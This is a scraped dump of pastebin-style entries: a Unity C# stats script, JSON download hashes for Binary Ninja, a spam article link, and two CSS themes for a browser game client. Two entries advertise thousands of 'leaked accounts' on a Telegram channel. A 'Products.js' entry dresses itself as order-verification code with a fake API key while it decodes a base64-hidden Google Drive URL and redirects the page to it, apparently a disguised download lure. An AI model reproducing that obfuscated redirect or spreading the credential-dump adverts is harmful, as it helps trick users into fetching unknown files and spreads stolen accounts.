    void Start()
    {
        maxStats=LoadMaxData();
    }

    public void SetLevelStat(int index, int value)
    {
        levelInfo[index] = value;
    }
    public void IncreaseLevelStat(int index, int increment)
    {
        levelInfo[index] += increment;
    }
    public void EmbedLevelDataToMatrix(int level)
    {
        try { matrixData[level] = levelInfo; } catch { matrixData.Add(levelInfo); };
        levelInfo = new int[numberOfStats];
    }

    public int[] LoadMaxData()
    {
        int[] mxStats = new int[numberOfStats];
        for (int i = 0; i < numberOfStats; i++)
        {
            mxStats[i]=PlayerPrefs.GetInt(""MaxStats_"" + i, 0);
        }
        return mxStats;
    }
    public void SaveMaxData(int[] data)
    {
        for (int i = 0; i < numberOfStats; i++)
        {
            int maxStat = maxStats[i] < data[i] ? data[i]: maxStats[i];
            PlayerPrefs.SetInt(""MaxStats_"" + i, maxStat);
        }
    }

    public void SaveActiveData()
    {
        int[] temporalData = SumData();

        for (int i = 0; i < numberOfStats; i++)
        {
            PlayerPrefs.SetInt(""TemporalStats_"" + i, temporalData[i]);
        }
    }
    void GetActiveData()
    {
        for (int i = 0; i < numberOfStats; i++)
        {
            temporalStats[i] = PlayerPrefs.GetInt(""TemporalStats_"" + i, 0);
        }
    }
    public void ResetActiveData()
    {
        for (int i = 0; i < numberOfStats; i++)
        {
            temporalStats[i] = 0;
        }
    }

    public int[] SumData()
    {
        int[] summedData = new int[numberOfStats];        

        for(var level=0; level<matrixData.Count;level++)
        {
            for (var i = 0; i < numberOfStats; i++)
            {
                summedData[i] += matrixData[level][i];
            }
        }
        for (var i = 0; i < numberOfStats; i++)
        {
            summedData[i] += temporalStats[i];
        }

        return summedData;
    }
}"
BVkVMC3x,PayPal with Balance,dentira,JavaScript,Wednesday 23rd of April 2025 04:05:01 PM CDT,02227 Accounts Posted On https://t.me/leakedbyeminem
TTwbMNS2,Products.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 04:03:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84996/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
r4r0Pcyn,BinaryNinja 5.0.7290,Timmon,JSON,Wednesday 23rd of April 2025 03:56:23 PM CDT,"{
  ""version"": ""5.0.7290"",
  ""hashes"": {
    ""binaryninja_macosx_stable_commercial.zip"": ""cbf816fbc30fd0c1e016b612ffc7bcbc8884d89e302954541967908b51f4cecd"",
    ""binaryninja_macosx_stable_commercial.dmg"": ""d69f136466cac657b26c962c19130dac78bc6425a06e2a180f9b268948faa7fe"",
    ""binaryninja_win64_stable_free.zip"": ""990e74c4791d5c00ad4f8e77c5b851bcddfa86d625f7771f353fbfae7d4f5a0f"",
    ""binaryninja_win64_stable_free.exe"": ""6a2d415767f9c7279aea49a5bae30c51103137b53bcccd557721705bf3db937e"",
    ""binaryninja_macosx_stable_ultimate.zip"": ""ae8d0530844d73db170c92a15a3d7eaca1128763005e6311bce7adc0f8e37b59"",
    ""binaryninja_macosx_stable_ultimate.dmg"": ""3d0bf2e83ddaca593421979bbfbeb4ec1552b7d623807b40e15d52702871b37c"",
    ""binaryninja_linux_stable_personal.zip"": ""05df0f2be86ff3767827ccf24bd8c3c2fde93d8f28e45ba1ae8dd16e94ea1ee7"",
    ""binaryninja_linux-arm_stable_commercial.zip"": ""378aaa93d669849f8e848f556b4754cd146207090c20959d7bd543c1ede11d2d"",
    ""binaryninja_linux-arm_stable_ultimate.zip"": ""abefb7f64c4951e1a57086646e4bc7615ae815833c655127579f50fe5a2e38aa"",
    ""binaryninja_linux_stable_free.zip"": ""17376ffb8e780238fc23199d731bdc0c678f16c4e69b23e99df05781ee29f225"",
    ""binaryninja_linux_stable_headless.zip"": ""9960902c4de1b8c18f30824d6ea05188ac6a044bbf205a213c69bb651d875d5b"",
    ""binaryninja_win64_stable_ultimate.zip"": ""092f5764396ed4a0d38492cf74a61111c180e4ab5ce458efb015d30851449da1"",
    ""binaryninja_win64_stable_ultimate.exe"": ""024987c117be0786c4b177c107ebc1e0d3670ec0f743b07f59efcd039bd7c0ec"",
    ""binaryninja_win64_stable_commercial.zip"": ""c48c4196aa8d2ac36ae7f1239d84d75e86aff634781a9058d298ff3afb779ef1"",
    ""binaryninja_win64_stable_commercial.exe"": ""1267f07ad6ff1f601bcc9c59cea5a7191b9be8cb77cff8bb30be02d6b4b04641"",
    ""binaryninja_linux-arm_stable_free.zip"": ""a1e744f0583841d7f8bd97b2cdb6cb5cb151c45eb9a5b6c836a86731fc52ba16"",
    ""binaryninja_macosx_stable_personal.zip"": ""9fda9c0d25f2160f5dacaa6b6c01314e508b8ee83349d7112138008c4a69e517"",
    ""binaryninja_macosx_stable_personal.dmg"": ""201935195238fa6252ae96696ea22cf9df9e215cf94246fb1ff60e5d0a751c68"",
    ""binaryninja_linux_stable_commercial.zip"": ""0161f191d2131f0570cf71bc57e48a91e24d3f5a7feb127707d0b0e46b017145"",
    ""binaryninja_linux_stable_ultimate.zip"": ""df426a1330cddf338a3ef95c3ca1094607e104bb0cd0828cbdef437ac0f3ee2c"",
    ""binaryninja_linux-arm_stable_personal.zip"": ""b5a194037313df06750732d177e9eac7bd760ba08758f77a02f6bae13b1e75c1"",
    ""binaryninja_macosx_stable_free.zip"": ""5bb00938c8987b124cb7d6aa9fec1241f54f9c0cfcaac80b757db0048f68f54d"",
    ""binaryninja_macosx_stable_free.dmg"": ""5b21f2a5ea89e059b841ed64b61143fb35d6f25a68fa00dafde9c9dfeae64c71"",
    ""binaryninja_win64_stable_personal.zip"": ""ee94684665b40563be9f329f02fffe815818cff90cb108274183e2d77e455e35"",
    ""binaryninja_win64_stable_personal.exe"": ""e4b3d31f88e8601547a872378275decd3abb5928ce49b9931fc53c99865df455""
  }
}"
vs1zrKcs,Untitled,f0f077,Python,Wednesday 23rd of April 2025 03:54:29 PM CDT,"How to Fully Automate Text Data Cleaning with Python in 5 Steps 
Text data cleaning is essential for any analysis or machine learning projects including text, especially those types of tasks which can be classified as natural language processing (NLP) or text analytics. Raw text often has errors, inconsistencies, and extra information that can affect your results. Common issues include misspellings, special characters, extra spaces, and wrong formatting. 
for more:https://short-jambo.ink/g7KtgV"
PTTrBWLF,MTZ Client CSS,PhantomGame,CSS,Wednesday 23rd of April 2025 03:51:01 PM CDT,"@import url('https://fonts.googleapis.com/icon?family=Material+Icons+Sharp');

:root {
	--main: #ff4900;
	--box-shadow: inset 0px 0px 5px 0px rgba(0,0,0,0.5);
	--grey1: rgb(48,48,48);
	--grey2: rgb(101,101,101)

}

/* font */

@font-face {
    font-family: 'Aldrich';
    src: url('https://fonts.cdnfonts.com/s/15646/Aldrich-Regular.woff') format('woff');
}

* {font-family: 'Aldrich', 'GameFont';
  font-weight: 600 }

.material-icons-outlined {
	font-family: 'Material Icons' !important;
}


/* ad hider  */
#aHider, #topRightAdHolder, #homeStoreAd, #streamContainer
{ display: none!important }


/*  */

#timerInner.topLeftOld, #leaderContainer, .greyInner,  #bottomLeftHealthBar, 
.greyInlineInner, .greyInlineInnerMid, .weapItem, .weapItemInner,
.weapStreakInner, .centerLeaderContainerInner
{ background-color: transparent }

.centerLeaderContainer, #ammoHolder, #timerHolder.topLeftOld,
.statIcon, #leaderboardHolder, #chatInputHolder, #bottomLeftTeamName,#bottomLeftPlayerLeft, #bottomLeftPlayerRight
{ background-color: rgba(0,0,0,.4) }

#mainLogo {
	display: none
}

#uiBase:not(.onCompMenu) #instructions {
	top: 100px;
	transform: translate(-50%, 0)
}

#mapInfoHolder {
	bottom: 120px;
}

.verticalSeparatorInline {
	height: 30px;
	transform: unset;
}

#termsInfo {
	background-color: transparent;
}

#menuItemContainer {
	flex-direction: row;
	width: 100%;
	height: 130px;
	top: unset;
}

.menuItem .menuItemTitle {
	margin-top: -15%;
}

#uiBase.onMenu #chatHolder {
	left: 10px;
	bottom: 150px;
}

#tlInfHold {
	left: 15px
}

/* menuclass */

.button, #policeButton {
	border: unset!important;
	border-radius: 0;
	box-shadow: inset 0px -7.5px 0px 0px rgba(0,0,0,0.25);
}

.buttonB, #policeButton {background-color:#414A6D}
.buttonPI {background-color:#fa50ae}
.buttonR {background-color:#ff4747}
.buttonP {background-color:#b447ff}
.buttonO {background-color:#FF6A0B}
.buttonG {background-color:#31caec}

.button:hover, .button:active {border: unset!important}

#uiBase.onMenu #spectButton {
	top: unset;
	bottom: 245px;
	left: unset;
	right: 175px;
	transform: unset;
	align-items: unset
}

#classPreviewCanvas {
	width: 500px !important;
	height: 400px !important;
	margin-right: -125px
}

#customizeButton {
	width: 350px;
	text-shadow: unset !important;
	font-weight: bold
}

.button span {display: none}

#menuClassContainer {
	bottom: 275px;
	right: 50px
}

/* healthbar */

#bottomLeftHealthBar {
    display: inline-flex;
    justify-content: center;
	align-items: center;
    background-color: rgba(0, 0, 0, 0.4);
    column-gap: unset;
    padding: unset;
    grid-area: healthbar;
	height: 30px;
	width: 325px
}

.nHealthBarSeg {
	width: -webkit-fill-available;
    margin-right: -1px;
    border-radius: 0;
    background-color: transparent;
	height: 100%
}

.nHpBSeg {
	border-radius: 0;
	box-shadow: inset 0px -7.5px 0px 0px rgba(0,0,0,0.25);
}

/* bottom left */

#bottomLeftPlayer {
    grid-template-areas: 
        ""profile healthval . ""
		""profile healthbar healthbar"" ;
    background-color: transparent;
	grid-template-rows: 52.5px auto;
	gap: 10px
}

#bottomLeftTeamType, #bottomLeftTeamName {
    display: none
}

#bottomLeftPlayerLeft {
	grid-area: profile;
	border-radius: 6px
}

#bottomLeftTeamHolder { display: contents }

#bottomLeftPlayerMid {
    display: contents;
    grid-area: healthbar;
}

#bottomLeftPlayerRight {
    grid-area: healthval;
    grid-template-columns: 20px auto;
    justify-content: flex-end;
    column-gap: 15px;
    direction: rtl;
    max-width: 100px;
    border-radius: 6px
}

#bottomLeftHealth {
	font-size: 30px
}

#bottomLeftChallIcon { width: 28px;height: 28px; }


/*  weap icon */

.weapItem[style*=""opacity: 0.5;""] {
    opacity: 1 !important
}

.weapItem[style*=""opacity: 0.5;""] *:not(.weapItemInner, .weapItemInner .weapKey) {
    opacity: .5 !important
} 

.weapSkin {
    background-color: transparent;
    color: #ffffff;
    left: unset;
    right: 2px;
	font-size: 15px;
    text-align: right;
}

.weapKey {
    font-size: 15px;
    opacity: 1!important;
    left: unset;
    right: -5px;
    background-color: transparent;
    z-index: 100
}

.weapKey::before, .weapKey::after {
    color: white;
    font-size: 15px;
}

.weapKey::before { content:""["" }
.weapKey::after { content:""]"" }


.weapStreakHolder { display: none }

.weapIcon {
	width: 140px;
	height: 70px;
}

#ammoHolder {
	font-size: 40px;
}

/* big stats icons */

.topRightCounters {
	display: inline-block;
	max-width: 700px
}

.topRightCounters .greyInner {
	padding: unset;
	margin: unset;
}

.statIcon {
	padding: 7px 14px;
    font-size: 32px;
	vertical-align: bottom !important;
}

.statIcon span {
	font-weight: normal 
}

#killsIcon, #deathsIcon, #streakIcon, #kdIcon {
    width: 32.5px;
    height: 32.5px;
	vertical-align: top
}

.statIcon .material-icons {
    font-size: 32.5px !important;
	vertical-align: top
}

/* misc */
#pingText, #ingameFPS, #pingDisplay, #fpsDisplay {
	font-size: 18px
}

#timerIcon, #timerVal.topLeftOld {
    vertical-align: middle
}

/* chat */

#chatInput {
	transition: all .08s;
	box-shadow: var(--box-shadow)
}

#uiBase.onGame #chatInput {
	opacity: 0;
}

#uiBase.onGame #chatInput:focus {
	opacity: 1
}

#chatInputHolder {
	grid-template-columns: 60px auto;
}

#chatHolder .greyInlineInnerMid {
	padding: unset;
	margin: unset;
}

#chatHolder .greyInlineInner:last-child {
	display: none
}

#chatHolder .greyInlineInner:first-child {
	background-color: var(--main);
	box-shadow: var(--box-shadow);
	border-radius: 6px;
	margin: unset
}

#chatInput {
	width: 100%;
	height: 100%;
	background-color: var(--grey1);
	font-size: 20px;
	border: unset
}

#chatInputHolder {
	background-color: transparent
}

#uiBase.onGame #chatInputHolder {
	grid-template-columns: auto;
	height: 55px;
}

#uiBase.onGame .greyInlineInner {
	display: none
}

#chatList::-webkit-scrollbar-thumb, 
#chatList::-webkit-scrollbar-track {
	border-radius: 0
}

#chatList::-webkit-scrollbar-thumb {
	background-color: var(--main);
	box-shadow: inset 0px 0px 5px 0px rgba(0,0,0,0.5);

}

#uiBase.onGame #chatList::-webkit-scrollbar {
	display: none
}

#chatList {
	background-color: transparent;
	direction: ltr;
}

.chatItem {
	font-size: 20px;
	text-shadow: 0px 0px 4px #202020;
	margin: 5px;
}

#uiBase.onMenu .chatItem {
	margin: unset;
	width: 390px;
	padding: 10px
}


/* Menu windows: INPUT */

.switch {
	width: 60px
}

.slider::before {
	width: 22px;
	border-radius: 20px
}

.slider, .sliderM, .sliderSml {
	border-radius: 20px;
	box-shadow: var(--box-shadow);
	background-color: var(--grey2)
}

.sliderM {
	background-color: var(--grey2);
	box-shadow: var(--box-shadow)
}

.sliderM::-webkit-slider-thumb {
	border-radius: 100%;
	width: 30px;
	height: 30px;
	background-color: var(--main)
}

.settingsBtn,
input:checked + .slider,
input:checked + .advancedSlider,
input:checked + .sliderSml, input[type=number],
.openCollection {
	background-color: var(--main) !important;
}

input[type=color] {
	border: unset;
	box-shadow: var(--box-shadow);
}

input[type=number] {
	background-color: var(--main);
	border: unset !important;
}

input[type=number] {
	box-shadow: var(--box-shadow)
}

.inputGrey2, option, .inputGrey2::placeholder {
	background-color: var(--grey2);
	color: white 
}


/* debugigng */

/* #instructionHolder,
#fullMenHider > *:not(#spectateUI){
    display: none!important
}

#spectateUI, #inGameUI {
    display: block!important
} */"
wPdZMYEy,Leaked Accounts - Fresh Hits,dentira,JavaScript,Wednesday 23rd of April 2025 03:49:31 PM CDT,15266 Accounts Posted On https://t.me/leakedbyeminem
TiCWgMky,Monochrome CSS,PhantomGame,CSS,Wednesday 23rd of April 2025 03:49:08 PM CDT,"/* INSTINCTSS' CSS - GAME */
/* THANK YOU NXXH DISCORD */
/* HUD SCALE: 0.5; RESOLUTION : 1920x1080 */
/* July 21, 2021 @ 6:08 PM */

/*========================================*/

/* COLORS */
:root {
    --white: #fff;
    --offwhite: #f8f8ff;
    --black: #000;
    --transp: #fff0;
    --AE86: #868686;
    --outline: -2px 0 #000, 0 2px #000, 2px 0 #000, 0 -2px #000;
    --outline2: -3px 0 #000, 0 3px #000, 3px 0 #000, 0 -3px #000;
	--div-grey: transparent

}

/* FONT */
@font-face {
	font-family: gamefont;
	src: url(https://fonts.gstatic.com/s/poppins/v15/pxiByp8kv8JHgFVrLEj6Z1xlFQ.woff2);
}

/*MAIN MENU*/
    /* LOGO */
    #mainLogo {
        content:url(https://i.postimg.cc/ZYw4G3nZ/Monochrome.png);
		height: 150px
    }
    #seasonLabel {
        display: none
    }

    /* CLUTTER CLEAR */
    #newsHolder, #voiceDisplay, #editorBtnM, .menuSocialB, #aContainer, #aHolder, #endAContainer, 
    #aMerger, #ot-sdk-btn-floating, .youNewDiv, #helpTxtHol, #menuMiniProfilePic,
    #mLevelCont, #instructions, #onetrust-consent-sdk, #topRightAdHolder, #streamContainer {
        display: none !important
    }


    /* BUTTONS */
    .button, .buttonB, .buttonPI, .buttonR, .buttonP, .buttonO, .buttonG, .buttonCL {
        background-color: var(--transp) !important;
        border: #fff0 !important;
        text-shadow: var(--outline);
        box-shadow: inset 0 -7px 0 0 var(--transp) !important
    }
    .button:hover, .buttonB:hover, .buttonPI:hover, .buttonR:hover, .buttonP:hover, .buttonO:hover, .buttonG:hover, .buttonCL:hover {
        background-color: var(--transp) !important;
        box-shadow: none !important;
        border: none !important;
        -webkit-transform: scale(.8) !important;
        transform: scale(.8) !important;
        color: var(--white) !important
    }
    .menuItem .menuItemTitle {
        color: var(--white);
        text-shadow: var(--outline)
    }
    #faceItIconM {
        display: none !important
    }
    #policeButton {
        border: unset !important
    }

/* MENU FPS + PING */
    #menuPingDisplay, #menuFPSDisplay {
        color: var(--white) !important;
        text-shadow: var(--outline)
    }
    #menuFPS {
        color: var(--white) !important
    }
    #menuPingText {
        color: var(--white);
        text-shadow: var(--outline)
    }
    #menuPingText:after {
        content: "" ms"";
        color: var(--white);
        text-shadow: var(--outline)
    }
    #menuPingDisplay .material-icons {
        display: none
    }


   /* ICONS */
            /* QUIT */
            #clientExit {
                display: flex
            }
			
            /* IMAGES */
            .iconProfile {
               background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217797293146132/sheding_settings.png)
            }
            .iconShop {
               background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847218170133741638/wangdian_shop.png)
            }
            .iconChall {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847220469412659220/tiaozhan_challenges.png)
            }
            .iconSocial {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217794604335134/jiaoji_social.png)
            }
            .iconGames {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217789449142322/boyi_games.png)
            }
            .iconSettings {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217797293146132/sheding_settings.png)
            }
            .iconMods {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217787159445544/bianhua_change.png)
            }
            .iconExit {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217792000327690/guanbi_shutdown.png)
            }
            .menuItem:hover .iconProfile {
               background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217798572802048/sheding_settings2.png);
            }
            .menuItem:hover .iconShop {
               background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847218172700393492/wangdian_shop2.png);
            }
             .menuItem:hover .iconChall {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847220470758506516/tiaozhan_challenges2.png);
            }
            .menuItem:hover  .iconSocial {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217795711893514/jiaoji_social2.png);
            }
            .menuItem:hover  .iconGames {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217790649499699/boyi_games2.png);
            }
            .menuItem:hover  .iconSettings {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217798572802048/sheding_settings2.png);
            }
            .menuItem:hover  .iconMods {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217788220997703/bianhua_change2.png);
            }
            .menuItem:hover .iconExit {
                background-image: url(https://cdn.discordapp.com/attachments/846260683996921856/847217793346961408/guanbi_shutdown2.png)
            }

/* MEAT */
    #instructionHolder {
        background-color: #000000bf
    }
    #windowHolder.popupWin {
        background-color: var(--transp)
    }
    .menuItem {
        background-color: var(--transp)
    }
    #menuWindow {
        box-shadow: none;
        background-color: var(--transp);
        border-radius: 15px;
        -webkit-box-shadow: none;
        -moz-box-shadow: none;
        box-shadow: none
    }
    #menuWindow.dark {
        background-color: #000000bf;
        -webkit-box-shadow: none;
        -moz-box-shadow: none;
        box-shadow: none
    }
    #menuRegionLabel {
        font-size: 30px;
    }
.headerBarRight .verticalSeparator {
	display: none
}
    .settName,.settNameSmall {
        color: var(--white) !important;
        text-shadow: (--outline) !important
    }
    #menuKRCount {
        color: var(--white);
        text-shadow: var(--outline)
    }
    .krSocial {
        color: var(--white);
        background-color: var(--black);
        box-shadow: var(--outline)
    }
    .krSocial:hover {
        background-color: var(--white);
        box-shadow: var(--outline)
    }
    .floatR, .menuLink, .smlInput, #requiresRestart {
        color: var(--white);
        text-shadow: var(--transp)
    }
    .updDisN, .subPassChg {
        background-color: var(--white)
    }
    .xpBar, .xpBarB, itemSearchH {
        background-color: var(--transp)
    }
    .xpBarV {
        font-size: 25px;
        text-shadow: var(--outline)
    }
    .progressBarInner {
        background: var(--white)
    }   
    #menuItemContainer, .menuItem, #termsInfo {
        color: var(--transp);
        background: var(--transp)
    }
    .headerBar {
        background-color: var(--transp);
    }

   /* BOTTOM RIGHT */
    #termsInfo, #mapInfoHolder {
        background-color: var(--transp);
        color: var(--white);
        text-shadow: var(--outline);
    }
    #mapInfoHolder::before {
        content: 'twitch.tv/InstinctssTV';
        color: var(--white);
        text-shadow: var(--outline);
        font-size: 15px;
    }

	#mapInfoHld {
		font-size: 0;
		border: unset
	}
    #mapInfo {
        color: var(--white);
        font-size: 30px;
        text-shadow: var(--outline);
        height: 25px
    }
    .verticalSeparatorInline {
        border-left: var(--transp)
    }

    /* SLIDERS */
    .sliderM {
        height: 10px;
        background-color: var(--white);
        border-radius: 5px
    }
    .sliderM::-webkit-slider-thumb {
        background-color: var(--white);
        width: 20px;
        height: 20px;
        border-radius: 50%;
        box-shadow: var(--outline) !important;
    }
    .slider:before {
        background-color: var(--white);
        width: 24px;
        height: 24px;
        left: 3px;
        border-radius: 50%;
        box-shadow: var(--outline) !important;
    }
    .slider {
        background-color: var(--white);
        -webkit-transition: .1s;
        width: 56px;
        height: 31px;
        transition: .1s;
        border-radius: 20px;
    }
    .sliderVal {
        color: var(--white);
        background-color: var(--transp);
        text-shadow: var(--outline);
    }
    input:checked+.slider {
        background-color: var(--AE86)
    }

	input:checked + .slider:before {
		transform: translateX(24px);
	}
	
        /* SPECTATE */
        .sliderSml {
            background-color: var(--AE86)
        }
        input:checked+.sliderSml {
            background-color: var(--black)
        }
        input:focus+.sliderSml {
            box-shadow: none
        }

    /* CUSTOMIZE */
        /* MODEL */
		#menuClassContainer {
			width: 450px;
			bottom: 200px;
		}
        #customizeButton .material-icons {
            display: none
        }
        #menuClassName, #menuClassIcn {
            display: none
        }
        #menuClassSubtext {
            display: none
        }
		#classPreviewCanvas {
			width: 625px !important;!i;!;
			height: 500px !important;!importa;!importam;!importamt;!importam;!import;!importn;!importna;!importnat;!importna;!importn;!i;!;
			margin-left: -50px;
			margin-bottom: 0;
		}
        #menuClassNameTag {
			display: block !important;
			position: absolute;
			text-shadow: none;
			color: #var(--white);
			font-size: 19px;
			right: 50%;
			bottom: 425px;
			transform: translateX(50%)
			}
        #customizeButton {
			display: block;
			position: absolute;
			right: 10px;
			bottom: 50px;
			opacity: 0;
			height: 350px;
			width: 350px;
			}
        .menuClassPlayerName {
            color: var(--white);
            text-shadow: var(--outline)
        }

        /* CLASS */
        .classCard {
            background-color: var(--transp);
            color: var(--white) !important;
            text-shadow: var(--outline)
        }
        .classWeap {
            text-shadow: var(--transp) !important;
            transition-duration: 0.25s
        }
        .classLvl {
            color: var(--white) !important;
            transition-duration: 0.25s;
            bottom: 30px;
            left: unset;
            right: 10px;
        }
        .classHP {
            color: var(--white) !important;
            transition-duration: 0.25s
        }
        .classHP span {
            color: var(--white) !important;
        }
        .classCard:hover .classHP {
            opacity: 0;
            transition-duration: 0.25s
        }
        .classCard:hover .classLvl {
            opacity: 0;
            transition-duration: 0.25s
        }
        .classCard:hover .classWeap {
            opacity: 0;
            transition-duration: 0.25s
        }
        .classCard:hover .clsXPBarC {
            opacity: 0;
            transition-duration: 0.25s
        }
        .classImgC {
            border-radius: 15px
        }
        .classXPBar {
            background-color: var(--transp);
            border-radius: 10px
        }
        .clsXPBarC {
            margin: 0;
            background-color: var(--white);
            height: 10px;
            border-radius: 10px;
        }
        .classCard:hover img {
            opacity: 1;
            transform: scale(1.25);
            transition-duration: 0.25s;
        }
        .classCard img {
            opacity: 0.5;
            transform: scale(1);
            transition-duration: 0.25s;
        }

        /* LOADOUT */
        .skinCard {
            border-left: none !important;
            border-right: none !important;
            border-top: none !important;
            border-bottom: none !important;
            padding-right: 15px !important;
            background-color: var(--transp);
            text-shadow: var(--outline);
            font-size: 20px;
        }
        .skinCard:hover {
            background-color: var(--transp);
        }
        .itemOwn, .selctInfoBtn, .itemCnt[data-badge]:after {
            display: none;
        }
        .itemSea {
            color: var(--transp) !important
        }

    /* SETTINGS + SERVERS */
    .serverHeader, .quickJoin, #serverSearch {
        background-color: var(--transp)
    }
    .settingsHeader, .serverHeader {
        background-color: var(--black)
    }
    .quickJoin, #serverSearch, #serverSearch::placeholder {
        color: var(--white) !important;
        text-shadow: var(--outline2) !important
    }
    .settingsBtn {
        color: var(--white);
        background-color: var(--transp);
        text-shadow: var(--outline)
    }
    .inputGrey2 {
        color: var(--white);
        background: var(--transp);
        text-shadow: var(--outline);
        border: 0
    }
    #settSearch {
        background-color: var(--transp);
        text-shadow: var(--outline)
    }
	
        /* SERVERS */
        .carousel {
            display: none
        }
        .setBodH {  
            background-color: var(--transp)
        }
        .setHed {
            background-color: var(--transp);
            color: var(--transp)
        }
        .setHed:hover {
            background-color: var(--transp)
        }
        .setHedS {
            border: 0px solid var(--transp);
            background-color: var(--transp);
            color: var(--white)
        }
        .quickJoin {
            background-color: var(--transp) !important;
            color: var(--white) !important;
            text-shadow: var(--outline);
            border: 4px solid var(--outline) !important;
        }
        a, a:active, a:visited {
            color: var(--white);
            text-shadow: var(--outline)
        }
        input:checked+.slider2 {
            background-color: var(--black)
        }
        .slider2 {
            background-color: var(--AE86);
        }
        #serverSearch {
            color: var(--white);
            background-color: var(--transp);
            text-shadow: var(--outline)
        }

        /* HOST GAME */
        .serverHostOp, .serverHostOpH {
            transition: font-size 0.20s cubic-bezier(0.20, 0.90, 0.30, 1.00);
            color: var(--white) !important;
            text-shadow: var(--outline2) !important;
            font-size: 50px;
            text-align: center;
            background-size: 0px;
            background-color: var(--transp) !important;
            border: none;
			padding-right: 15px;
			margin: unset !important
         }
        .serverHostOpH {
            display: none
        }
		.serverHostOp-small {
			margin-bottom: 20px !important
		}
        .serverHostOp:hover {
             font-size: 60px;
        }
        .hostMapName {
            text-align: center;
            width: 100%;
            padding-top: 40px;
            padding-left: 0px;
            font-size: 15px;
            left: 0px;
            top: 0px;
            background: transparent;
        }
        .hostMap {
            border: none;
            border-radius: 10px !important
        }
        .hostMapVersion, .hostMapYear, .hostMapBy, .mapInfoT {
            display: none;
        }
        .hostMapImg, .hostMapImg:hover {
            filter: grayscale(100%);
        }
        .hostMapImg {
            transition: 0.5s;
            border-radius: 10px !important
        }
        .hostPresetBtn {
            color: var(--white);
            background-color: var(--transp);
            text-shadow: var(--outline)
        }
        .hostOpt {
            border: none
        }
        .optCheck {
            background-color: var(--transp)
        }
        .optImg {
            top: 4px;
            width: 35px;
            right: 2px;
            opacity: 50%
        }
        .optName {
            text-shadow: var(--outline);
            color: var(--white);
            z-index: 1;
            font-size: 15px;
        }
        input:checked+.optCheck {
            background-color: var(--black)
        }
        input:hover+.optCheck {
            background-color: var(--white)
        }

    .accountButton {
        background-color: var(--black)
    }
    .formInput, .formInput::placeholder {
        color: var(--white);
        text-shadow: var(--outline);
    }
    .loadoutBtn, .hostToggle, .hostToggle:hover {
        color: var(--white);
        background-color: var(--transp);
        text-shadow: var(--outline);
    }

/* IN-GAME HUD */
    /* ICONS */
#hudClassIcon, #timerIcon, #maxHP, #healthBar, #bottomLeftPlayerLeft, #bottomLeftPlayerMid, #ammoMax, #ammoIcon, #bottomLeftChallIcon, #matchInfo.topLeftOld, #curGameInfo, #reloadMsg {
	display: none !important
}
.statIcon {
	background-color: var(--transp)
}
.statIcon span {
    color: var(--white);
    text-shadow: var(--outline)
}

    /* HEALTH */
#bottomLeftPlayer {
	background-color: var(--transp)
}
#bottomLeftHealth {
	background-color: var(--transp);
	width: 75px;
	height: 65px;
	etter-spacing: 1px;
	position: fixed;
	left: 40%;
	bottom: 10%;
	margin-bottom: 10%;
	align-items: center;
	font-size: 40px;
	text-align: center;
	color: var(--white);
	margin-top: 0;
	will-change: unset;
	text-shadow: var(--outline)
}

    /* AMMO */
#ammoVal {
    position: fixed;
    right: 40% !important;
    bottom: 10% !important;
    margin-bottom: 10% !important;
    font-size: 40px !important;
    text-shadow: var(--outline);
}
#ammoHolder {
    background-color: var(--transp) !important;
    width: 65px;
    height: 5px;
	top: calc(50% + 35px);
	left: calc(50% - 35px);
    background-color: var(--transp);
    letter-spacing: 1px;
    border-radius: 0px;
    position: fixed;
    padding: 0;
    padding-top: 0;
    padding-left: 0;
    transform: none;
}
#reloadMsg {
	bottom: 150px;
	text-shadow: var(--outline)
}

    /* TIMER */
#timerHolder.topLeftOld {
    left: 50%;
    top: 100px;
	background-color: transparent;
	text-shadow: var(--outline);
	margin-right: 20px
}

#timerInner.topLeftOld {
	padding: unset;
	margin: unset
}

    /* LEADERBOARD */
.leaderNameM, .newLeaderNameM, .endTableN[style='color: #fff;'] {
    color: var(--white);
    text-shadow: var(--outline)
}
.leaderNameF, .newLeaderNameF, .endTableN[style='color: rgba(255,255,255,.6);'] {
    color: #d4d4d4 !important;
    text-shadow: var(--outline)
}
.leaderName, .newLeaderName, .endTableN[style='color: #eb5656;'] {
    color: #7d7d7d !important;
    text-shadow: var(--outline)
}
.leaderScore {
    color: var(--white) !important;
    text-shadow: var(--outline)
}
.leaderCounter {
    color: var(--white) !important;
    text-shadow: var(--outline)
}
#leaderboardHolder {
    background-color: var(--transp) !important
}
		/* SCORES */
		#teamScores {
			position: fixed;
			top: 10px;
			left: 50%;
